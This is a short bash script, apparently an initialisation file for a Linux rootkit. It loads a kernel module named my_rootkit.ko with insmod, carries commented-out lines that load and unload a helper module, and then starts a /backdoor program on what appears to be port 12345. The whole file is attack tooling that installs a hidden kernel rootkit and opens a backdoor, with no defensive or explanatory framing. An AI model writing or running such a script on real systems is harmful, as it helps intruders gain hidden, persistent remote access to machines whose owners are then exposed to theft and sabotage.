#!/bin/bash
# ./my_rootkit_init.sh
insmod /my_rootkit.ko
#insmod /remove_module.ko
#rmmod remove_module
/backdoor 12345
